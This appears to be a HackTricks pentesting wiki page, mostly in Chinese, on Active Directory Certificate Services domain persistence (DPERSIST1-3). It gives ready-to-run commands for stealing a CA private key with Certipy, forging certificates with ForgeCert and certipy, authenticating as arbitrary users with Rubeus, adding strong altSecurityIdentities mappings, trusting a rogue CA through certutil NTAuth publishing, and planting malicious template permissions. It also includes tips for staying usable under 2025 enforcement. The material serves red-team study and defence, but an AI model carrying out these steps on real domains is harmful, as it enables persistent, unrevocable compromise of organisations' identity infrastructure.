# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**这是对 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) 中共享的域持久性技术的摘要。** 详情请参阅原文。

## 使用被盗 CA 证书伪造证书 - DPERSIST1

如何判断某个证书是 CA 证书？

如果满足以下若干条件，则可以确定该证书为 CA 证书：

- 该证书存储在 CA 服务器上，其私钥由机器的 DPAPI 保护，或者在操作系统支持的情况下由 TPM/HSM 等硬件保护。
- 证书的 Issuer 和 Subject 字段都与 CA 的 distinguished name 相匹配。
- 仅在 CA 证书中存在 "CA Version" 扩展。
- 证书缺少 Extended Key Usage (EKU) 字段。

要提取该证书的私钥，CA 服务器上的 `certsrv.msc` 工具通过内置 GUI 是受支持的方法。不过，该证书与系统中存储的其他证书并无不同；因此，也可以使用诸如 [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) 的方法进行提取。

也可以使用 Certipy 获取证书和私钥，命令如下：
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
在获取 CA 证书及其以 `.pfx` 格式的私钥后，可以使用像 [ForgeCert](https://github.com/GhostPack/ForgeCert) 这样的工具来生成有效的证书：
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 目标用于证书伪造的用户必须在 Active Directory 中处于活动状态并且能够进行身份验证，操作才能成功。对像 krbtgt 这样的特殊账户伪造证书是无效的。

该伪造证书将会在指定的结束日期之前保持**有效**，并在**根 CA 证书有效**期间（通常为 5 至 **10+ 年**）有效。它也适用于**机器**，因此结合 **S4U2Self**，攻击者可以在 CA 证书有效的整个期间**在任何域机器上维持持久性**。\
此外，用此方法**生成的证书****无法被撤销**，因为 CA 并不知道它们的存在。

### 在强证书映射强制执行（2025+）下的操作

自 2025 年 2 月 11 日（KB5014754 推出后）起，域控制器在证书映射方面默认使用 **Full Enforcement**。实际上，这意味着你伪造的证书必须满足以下之一：

- 包含与目标账户的强绑定（例如，SID 安全扩展），或
- 与目标对象的 `altSecurityIdentities` 属性配对一个强、明确的映射。

一个可靠的持久化方法是伪造一个链到被窃取 Enterprise CA 的证书，然后向受害主体添加一个强的显式映射：
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
注意
- 如果你能制作包含 SID security extension 的伪造证书，即使在 Full Enforcement 下也会隐式映射。否则，优先选择显式的强映射。有关显式映射的更多信息，请参见 [account-persistence](account-persistence.md)。
- 撤销在此对防御者无济于事：伪造证书对 CA 数据库来说是未知的，因此无法被撤销。

## 信任恶意 CA 证书 - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **CA certificates** within its `cacertificate` attribute, which Active Directory (AD) utilizes. **域控制器** 的验证过程会检查 `NTAuthCertificates` 对象，查找是否存在与验证 **证书** 的 Issuer 字段中指定的 **CA** 相匹配的条目。如果找到匹配项，则继续进行身份验证。

攻击者若能控制该 AD 对象，则可以将自签名 CA 证书添加到 `NTAuthCertificates` 对象中。通常，只有 **Enterprise Admin** 组的成员，以及位于 **forest root’s domain** 的 **Domain Admins** 或 **Administrators**，才有权限修改该对象。它们可以使用 `certutil.exe` 并运行命令 `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` 来编辑 `NTAuthCertificates` 对象，或使用 [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)。

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
当与前面描述的使用 ForgeCert 动态生成证书的方法结合时，此能力尤为重要。

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## 恶意错误配置 - DPERSIST3

通过对 AD CS 组件的安全描述符进行修改存在大量实现 **persistence** 的机会。在 "[Domain Escalation](domain-escalation.md)" 一节中描述的修改，具有提升权限的攻击者可将其恶意实施。这包括向以下敏感组件添加“控制权限”（例如 WriteOwner/WriteDACL 等）：

- CA 服务器的 **AD 计算机对象**
- CA 服务器的 **RPC/DCOM 服务**
- 位于 **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 中的任何 **后代 AD 对象或容器**（例如 Certificate Templates container、Certification Authorities container、NTAuthCertificates object 等）
- 默认或由组织委派有权控制 AD CS 的 **AD 组**（例如内置的 Cert Publishers 组及其成员）

一个恶意实施的例子是：攻击者在域中拥有 **elevated permissions**，向默认的 **`User`** 证书模板添加 **`WriteOwner`** 权限，并将攻击者设为该权限的主体。为利用此权限，攻击者会先将 **`User`** 模板的所有权更改为自己。随后，在模板上将 **`mspki-certificate-name-flag`** 设置为 **1**，以启用 **`ENROLLEE_SUPPLIES_SUBJECT`**，允许用户在请求中提供 Subject Alternative Name。随后，攻击者可以使用该 **template** 进行 **enroll**，在备用名称中选择一个 **域管理员** 名称，并使用获取的证书以 DA 身份进行认证。

攻击者为实现长期域持久化可能设置的实用选项（完整细节及检测见 {{#ref}}domain-escalation.md{{#endref}}）：

- 允许请求方提供 SAN 的 CA 策略标志（例如启用 `EDITF_ATTRIBUTESUBJECTALTNAME2`）。这会使类似 ESC1 的路径保持可利用状态。
- 允许颁发具备认证能力证书的模板 DACL 或设置（例如添加 Client Authentication EKU，启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`）。
- 控制 `NTAuthCertificates` 对象或 CA 容器，以便在防御方尝试清理时持续重新引入恶意颁发者。

> [!TIP]
> 在应用 KB5014754 后的加固环境中，将这些错误配置与显式强映射（`altSecurityIdentities`）配对，可确保在 DC 强制映射时，你颁发或伪造的证书仍然可用。

## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
